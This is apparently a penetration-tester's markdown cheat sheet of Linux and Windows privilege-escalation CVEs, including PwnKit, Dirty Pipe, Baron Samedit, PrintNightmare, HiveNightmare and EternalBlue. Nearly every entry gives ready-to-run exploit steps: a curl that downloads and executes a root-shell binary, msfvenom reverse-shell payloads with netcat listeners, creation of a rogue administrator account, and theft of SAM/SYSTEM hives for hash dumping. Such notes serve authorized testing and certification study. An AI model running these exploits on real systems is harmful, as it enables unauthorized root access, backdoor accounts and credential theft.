# CVE PrivEsc — [Back to Linux PrivEsc](privesc_main.md) | [Back to Windows PrivEsc](windows_privesc.md) | [Back to Main](../README.md)

Quick check + exploit per high-value CVE. Always verify version before running.

---

## Linux CVEs

### PwnKit — CVE-2021-4034 (polkit pkexec)

**Impact:** Any local user → root. Affects virtually every Linux distro, polkit < 0.120 (varies by distro).

```bash
# Check
rpm -q polkit 2>/dev/null || dpkg -l policykit-1 2>/dev/null
# Vulnerable: Ubuntu < 0.105-26ubuntu1.2, Debian < 0.105-15+deb10u4, RHEL < 0.115-13

# Fastest: pre-compiled single binary
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/pk
chmod +x /tmp/pk && /tmp/pk   # drops to root shell immediately

# Alt: compile from source (no curl/wget? copy-paste the C)
# https://github.com/ly4k/PwnKit
```

---

### Dirty Pipe — CVE-2022-0847

**Impact:** Any local user → root via overwriting SUID binaries or root-owned files.
**Affected:** Linux kernel 5.8.0 – 5.16.11, 5.15.0 – 5.15.25, 5.10.0 – 5.10.102.

```bash
# Check kernel version
uname -r
# 5.8 – 5.16.11 = likely vulnerable

# Exploit 1: inject into /etc/passwd to add root user
# https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
gcc exploit1.c -o dirtypipe
./dirtypipe   # creates root shell at /tmp/sh, spawns it

# Exploit 2: hijack SUID binary temporarily for RCE
./exploit2 /usr/bin/sudo   # temporarily overwrites sudo to spawn root shell
```

---

### Dirty COW — CVE-2016-5195

**Impact:** Any local user → root via race condition in copy-on-write. Old but still appears on CTFs.
**Affected:** Linux kernel < 4.8.3.

```bash
# Check
uname -r   # pre-4.8.3 = vulnerable

# Exploit: write to read-only /etc/passwd
# https://github.com/dirtycow/dirtycow.github.io
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <new_root_password>
# Creates 'firefart' user with root UID
su firefart
```

---

### Baron Samedit — CVE-2021-3156 (sudo heap overflow)

**Impact:** Any local user → root. Affects sudo < 1.9.5p2.

```bash
# Check
sudo --version   # 1.8.2 – 1.8.31p2, 1.9.0 – 1.9.5p1 = vulnerable
# Quick test (should produce a malloc error if vulnerable, not "usage"):
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# Exploit
# https://github.com/blasty/CVE-2021-3156
make
./sudo-hax-me-a-sandwich   # try 0, 1, 2 based on OS
./sudo-hax-me-a-sandwich 0   # Ubuntu 20.04 / sudo 1.8.31
./sudo-hax-me-a-sandwich 1   # Debian 10 / sudo 1.8.27
./sudo-hax-me-a-sandwich 2   # Fedora 33 / sudo 1.9.2
```

---

### Polkit AuthAdmin Bypass — CVE-2021-3560

**Impact:** Any local user → root via race condition in polkit authentication.
**Affected:** polkit < 0.119 on some distros (RHEL 8, Ubuntu 20.04 LTS older versions).

```bash
# Check polkit version
pkexec --version

# Exploit (timing-based race — may need multiple attempts)
# https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
bash exploit.sh   # creates new sudo user
```

---

## Windows CVEs

### PrintNightmare — CVE-2021-1675 / CVE-2021-34527

**CVE-2021-1675** = LPE (local privilege escalation via DLL loading in Print Spooler)
**CVE-2021-34527** = RCE (remote code execution via Print Spooler — requires network access)

```powershell
# Check — Print Spooler must be running
sc query Spooler
Get-Service -Name Spooler

# LPE — from low-priv local shell, adds admin user
# https://github.com/calebstewart/CVE-2021-1675
# Upload and run:
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!"
net localgroup administrators hacker   # verify
```

**RCE from LHOST (requires creds + Print Spooler running on target):**
```bash
# https://github.com/cube0x0/CVE-2021-1675
# Generate DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o evil.dll
impacket-smbserver -smb2support share $(pwd)

# Start listener
rlwrap nc -lvnp $LPORT

# Trigger RCE
python3 CVE-2021-1675.py $DOMAIN/user:'password'@$IP '\\$LHOST\share\evil.dll'
```

---

### HiveNightmare / SeriousSam — CVE-2021-36934

**Impact:** Any local user can read SAM, SYSTEM, SECURITY — extract local hashes without admin.
**Affected:** Windows 10 1809+ before Oct 2021 patches. Check ACL on SAM file.

```powershell
# Check
icacls C:\Windows\System32\config\SAM
# Vulnerable if: BUILTIN\Users:(I)(RX) is present

# Exploit — read via Volume Shadow Copy
$vss = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1).DeviceObject + "\"
cmd /c copy "$vss\Windows\System32\config\sam" C:\Temp\sam
cmd /c copy "$vss\Windows\System32\config\system" C:\Temp\system
cmd /c copy "$vss\Windows\System32\config\security" C:\Temp\security

# Transfer to LHOST — dump hashes
impacket-secretsdump LOCAL -sam sam -system system -security security
```

---

### EternalBlue — MS17-010 (CVE-2017-0144)

**Impact:** Unauthenticated RCE as SYSTEM on unpatched SMBv1.
**Affected:** Windows XP – Windows Server 2016 without MS17-010 patch.

```bash
# Check
nmap --script smb-vuln-ms17-010 -p 445 $IP
nxc smb $IP -u '' -p '' -M ms17-010

# Exploit — OSCP: manual PoC preferred
# https://github.com/3ndG4me/AutoBlue-MS17-010
python3 eternal_checker.py $IP
# Generate shellcode:
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  EXITFUNC=thread -f raw -e x86/shikata_ga_nai -b '\x00' > sc_x86.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  EXITFUNC=thread -f raw > sc_x64.bin
rlwrap nc -lvnp $LPORT
python3 eternalblue_exploit7.py $IP shellcode/sc_all.bin  # Win7

# PT ONLY (one-liner):
msf> use exploit/windows/smb/ms17_010_eternalblue
```

---

### PrintSpoofer / Potatoes (SeImpersonatePrivilege)

Not a single CVE — class of token impersonation attacks. Covered in [Windows PrivEsc](windows_privesc.md) under Token Impersonation.

| Tool | Works On |
|---|---|
| GodPotato | Server 2012–2022, Win 8–11 |
| PrintSpoofer | Win 10 / Server 2016/2019 |
| JuicyPotato | Win < Server 2019 |
| SweetPotato | Win 10 / Server 2019+ |
| RoguePotato | Server 2019+ |

Use **GodPotato** first — broadest compatibility.

---

## Quick Version Check Script (Linux)

```bash
# Dump kernel + common tool versions for fast CVE matching
uname -r
sudo --version 2>/dev/null
pkexec --version 2>/dev/null
dpkg -l policykit-1 2>/dev/null | tail -1
rpm -q polkit 2>/dev/null
cat /etc/os-release | grep -E "NAME|VERSION"
```
